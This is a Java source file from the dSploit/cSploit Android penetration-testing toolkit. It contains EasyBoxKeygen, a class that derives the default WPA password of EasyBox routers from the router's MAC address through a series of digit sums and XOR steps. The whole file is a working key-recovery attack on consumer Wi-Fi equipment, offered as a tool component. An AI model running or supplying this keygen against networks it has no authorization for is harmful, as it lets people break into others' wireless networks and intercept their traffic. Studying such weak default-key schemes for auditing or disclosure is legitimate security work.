/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.csploit.android.wifi.algorithms;

import java.util.List;

import org.csploit.android.wifi.Keygen;

public class EasyBoxKeygen extends Keygen{

  public EasyBoxKeygen(String ssid, String mac, int level, String enc){
    super(ssid, mac, level, enc);
  }

  @Override
  public List<String> getKeys(){
    final String mac = getMacAddress();
    if(mac.length() != 12){
      setErrorMessage("The MAC address is invalid.");
      return null;
    }
    String C1 = Integer.toString(Integer.parseInt(mac.substring(8), 16));

    while(C1.length() < 5)
      C1 = "0" + C1;

    final char S7 = C1.charAt(1);
    final char S8 = C1.charAt(2);
    final char S9 = C1.charAt(3);
    final char S10 = C1.charAt(4);
    final char M9 = mac.charAt(8);
    final char M10 = mac.charAt(9);
    final char M11 = mac.charAt(10);
    final char M12 = mac.charAt(11);


    final String tmpK1 = Integer.toHexString(Character.digit(S7, 16) + Character.digit(S8, 16) + Character.digit(M11, 16) + Character.digit(M12, 16));
    final String tmpK2 = Integer.toHexString(Character.digit(M9, 16) + Character.digit(M10, 16) + Character.digit(S9, 16) + Character.digit(S10, 16));

    final char K1 = tmpK1.charAt(tmpK1.length() - 1);
    final char K2 = tmpK2.charAt(tmpK2.length() - 1);

    final String X1 = Integer.toHexString(Character.digit(K1, 16) ^ Character.digit(S10, 16));
    final String X2 = Integer.toHexString(Character.digit(K1, 16) ^ Character.digit(S9, 16));
    final String X3 = Integer.toHexString(Character.digit(K1, 16) ^ Character.digit(S8, 16));
    final String Y1 = Integer.toHexString(Character.digit(K2, 16) ^ Character.digit(M10, 16));
    final String Y2 = Integer.toHexString(Character.digit(K2, 16) ^ Character.digit(M11, 16));
    final String Y3 = Integer.toHexString(Character.digit(K2, 16) ^ Character.digit(M12, 16));
    final String Z1 = Integer.toHexString(Character.digit(M11, 16) ^ Character.digit(S10, 16));
    final String Z2 = Integer.toHexString(Character.digit(M12, 16) ^ Character.digit(S9, 16));
    final String Z3 = Integer.toHexString(Character.digit(K1, 16) ^ Character.digit(K2, 16));

    final String wpaKey = X1 + Y1 + Z1 + X2 + Y2 + Z2 + X3 + Y3 + Z3;
    addPassword(wpaKey.toUpperCase());
    return getResults();
  }
}
